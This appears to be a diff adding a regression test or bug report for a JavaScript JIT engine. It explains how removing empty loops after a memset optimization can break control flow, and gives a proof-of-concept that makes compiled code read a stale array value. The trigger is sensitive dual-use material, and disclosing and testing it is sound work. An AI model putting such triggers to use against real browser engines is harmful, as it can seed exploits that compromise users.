@@ -1,0 +1,76 @@
+/*
+The optimizations for memory operations may leave empty loops as follows:
+
+for (let i = 0; i < arr.length; i++) {
+    arr[i] = 0;
+}
+
+Becomes:
+
+Memset(arr, 0, arr.length);
+for (let i = 0; i < arr.length; i++) {
+    // empty!
+}
+
+These empty loops will be removed by "BackwardPass::RemoveEmptyLoopAfterMemOp". But this method just removes them without considering branches.
+
+Here's what may happen.
+
+A:
+Memset(arr, 0, arr.length);
+
+for (let i = 0; i < arr.length; i++) {
+    
+}
+goto D;  // Actually, this's a "BrGe_I4" instruction in the PoC.
+
+C:
+...
+
+D:
+...
+
+Becomes:
+
+A:
+Memset(arr, 0, arr.length);
+
+C:
+...
+
+D:
+...
+
+So, this may break the control flow.
+
+
+PoC:
+*/
+
+function opt(a, b, always_true = true) {
+    a[0] = 1234;
+    b[0] = 0;
+
+    let arr = a;
+    if (always_true) {
+        arr = b;
+        for (let i = 0; i < arr.length; i++)
+            arr[i] = 0;
+    }
+
+    let val = arr[0];
+    if (val) {
+        print(val);  // Must be 0, but prints out 1234
+        return true;
+    }
+
+    return false;
+}
+
+let a = new Uint32Array(1);
+let b = new Uint32Array(0x1000);
+for (let i = 0; i < 10000; i++) {
+    if (opt(a, b)) {
+        break;
+    }
+}
